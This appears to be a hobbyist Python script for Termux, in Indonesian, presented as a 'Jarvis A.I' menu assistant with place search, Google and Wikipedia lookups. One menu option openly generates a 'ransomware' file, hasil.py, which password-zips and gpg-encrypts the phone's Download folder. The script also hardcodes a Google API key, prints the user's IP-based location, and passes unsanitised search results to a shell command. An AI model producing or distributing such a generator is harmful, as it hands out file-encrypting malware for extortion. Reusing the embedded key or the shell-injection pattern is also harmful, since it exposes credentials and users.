import os
import requests
import json
from time import sleep
import random, sys

try:
	from googlesearch import search
	from bs4 import BeautifulSoup
	import geocoder
except ImportError:
	os.system('pip install google &> /dev/null')
	os.system('pip install bs4 &> /dev/null')
	os.system('pip install geocoder &> /dev/null')

def tik(s):
	for khaz in s + '\n':
		sys.stdout.write(khaz)
		sys.stdout.flush()
		sleep(random.random() * 0.2)

def jarvis():
	tik("\033[1;97mHalo, selamat datang di program jarvis\nperkenalkan, saya adalah jarvis A.I\n\033[1;97mSiapa nama kamu?")
	sleep(1)
	nama = input("\033[1;91m> \033[1;97m")
	import geocoder
	g = geocoder.ip("me")
	if not nama:
		jarvis()
	if nama:
		sleep(1)
		tik("\n\033[1;92m[\033[1;97m+\033[1;92m]\033[1;97mNama: \033[1;96m{}".format(nama))
		tik("\033[1;92m[\033[1;97m+\033[1;92m]\033[1;97mIP: \033[1;96m{}".format(g.ip))
		tik("\033[1;92m[\033[1;97m+\033[1;92m]\033[1;97mLokasi: \033[1;96m{}".format(g.city))
		tik("\n\033[1;97mKamu mau ngapain, {}?".format(nama))
		jawab = input(nama+" > ")
		if not jawab:
			exit()
		elif "cari tempat" in jawab:
			sleep(1)
			tik("\033[1;97mKamu ingin {}, tunggu sebentar".format(jawab))
			sleep(1)
			cari_tempat()
		elif "ransomeware" in jawab:
			sleep(1)
			tik("\033[1;97mKamu ingin membuat {}, tunggu sebentar".format(jawab))
			sleep(1)
			ransomeware()
		elif "google" in jawab:
			sleep(1)
			tik("\033[1;97mKamu ingin membuka {}, tunggu sebentar".format(jawab))
			sleep(1)
			google()
		elif "wikipedia" in jawab:
			sleep(1)
			tik("\033[1;97mKamu ingin membuka {}, tunggu sebentar".format(jawab))
			sleep(1)
			wikipedia()

		else:
			print ("\n\033[1;92m1. \033[1;97mKetik cari tempat untuk mencari tempat")
			print ("\033[1;92m2. \033[1;97mKetik ransomeware untuk membuat virus")
			print ("\033[1;92m3. \033[1;97mKetik wikipedia untuk membuka wikipedia")
			print ("\033[1;92m4. \033[1;97mKetik google untuk mencari google")
			a = input("\n\033[1;97mTekan enter untuk kembali")
			jarvis()
	else:
		exit()


def cari_tempat():
	api_key = 'AIzaSyChq3CxzQwiXbCmqXHvO4cuMjQKXiwoutg'
	url = "https://maps.googleapis.com/maps/api/place/textsearch/json?"
	tik("\033[1;97m\nMau cari apa?")
	query = input("\033[1;91m>\033[1;97m ")
	print ("")
	r = requests.get(url + 'query=' + query +
        	                '&key=' + api_key)
	x = r.json()
	y = x['results']
	for i in range(len(y)):
		tik("\033[1;92m[\033[1;97m+\033[1;92m]\033[1;97m"+y[i]['name'])

	while True:
		ok = input("\033[1;97m\nApakah ada yg mau dicari lagi? (y/n) ")
		if ok == "y":
			cari_tempat()
		elif ok == "n":
			jarvis()

def ransomeware():
	tik("\n\033[1;92m[\033[1;97m+\033[1;92m]\033[1;97mSedang menulis script kamu ")
	sleep(2)
	tik("""
\033[1;36mimport \033[1;97mos
\033[1;36mimport \033[1;97mrandom
\033[1;96mimport \033[1;97mtime
\033[1;96mimport \033[1;97mzipfile
\033[1;96mimport \033[1;97mshutil
\033[1;96mimport \033[1;97mglob
\033[1;96mimport \033[1;97msys

\033[1;96mtry\033[1;97m:
	\033[1;96mimport \033[1;97mgnupg
\033[1;96mexcept \033[1;97mImportError:
	\033[1;97mos.system(\033[1;92m'pkg install gnupg -y &> /dev/null"\033[1;97m)
	\033[1;97mos.system(\033[1;92m'pkg install zip -y &> /dev/null'\033[1;97m)

\033[1;97mos.system(\033[1;92m'zip --password crypto123 cryptocyber9.zip /sdcard/Download &> /dev/null'\033[1;97m)
\033[1;97mos.system(\033[1;92m'gpg --batch -c --passphrase crypto123 cryptocyber9.zip &> /dev/null'\033[1;97m)
\033[1;97mos.system(\033[1;92m'rm -rf cryptocyber9.zip'\033[1;97m)""")
	with open("hasil.py","w") as khaz:
		khaz.write("import os\n")
		khaz.write("import random\n")
		khaz.write("import time\n")
		khaz.write("import zipfile\n")
		khaz.write("import sys\n")
		khaz.write("\ntry:\n")
		khaz.write("\timport gnupg\n")
		khaz.write("except ImportError:\n")
		khaz.write("\tos.system('pkg install gnupg zip -y &> /dev/null')\n")
		khaz.write("\nos.system('zip --password crypto123 cryptocyber9.zip /sdcard/Download &> /dev/null')\n")
		khaz.write("os.system('gpg --batch -c  --passphrase crypto123 cryptocyber9.zip &> /dev/null')\n")
		khaz.write("os.system('rm -rf cryptocyber9.zip')\n")

	tik("\n\033[1;97mScript kamu sudah dibuat, nama file \033[1;96m(hasil.py)")
	while True:
		a = input("\033[1;97mApakah ada yang mau dicari lagi? (y/n) ")
		if a == "y":
			jarvis()
		else:
			exit()

def google():
	tik("\n\033[1;97mMau cari apa?")
	query = input("\033[1;91m> \033[1;97m")
	for j in search(query, tld="co.in", num=10, stop=1, pause=2):
		tik("\n\033[1;92m[\033[1;97m+\033[1;92m]\033[1;97mHasil link: \033[1;91m"+j)
		tik("\033[1;92m[\033[1;97m+\033[1;92m]\033[1;97mSedang membuka chrome ...")
		os.system('termux-open-url '+j)

	while True:
		a = input("\n\033[1;97mApakah ada yang mau dicari lagi? (y/n) ")
		if a == "y":
			google()
		else:
			jarvis()

def wikipedia():
	tik("\n\033[1;97mMau cari apa? ")
	a = input("\033[1;91m> \033[1;97m")
	url = "https://id.wikipedia.org/wiki/"+a
	r = requests.get(url)
	soup = BeautifulSoup(r.content,'html.parser')
	for khaz in soup.select("p"):
		print ("\n\033[1;92m"+khaz.getText())
	while True:
		a = input("\n\033[1;97mApakah ada yang mau dicari lagi? (y/n) ")
		if a == "y":
			wikipedia()
		else:
			jarvis()

if __name__=="__main__":
	os.system('clear')
	print ("""

  \033[1;32m    __     _      ___     _ __    __     ___
  \033[1;32m   / /   .' \    / o |   /// /   / /   ,' _/
  \033[1;37mn_/ /   / o /   /  ,'   | V /   / /   _\ `. 
  \033[1;37m\_,'() /_n_/() /_/`_\() |_,'() /_/() /___,' 

	    \033[1;33mcode by cryptocyber9\n""");jarvis()

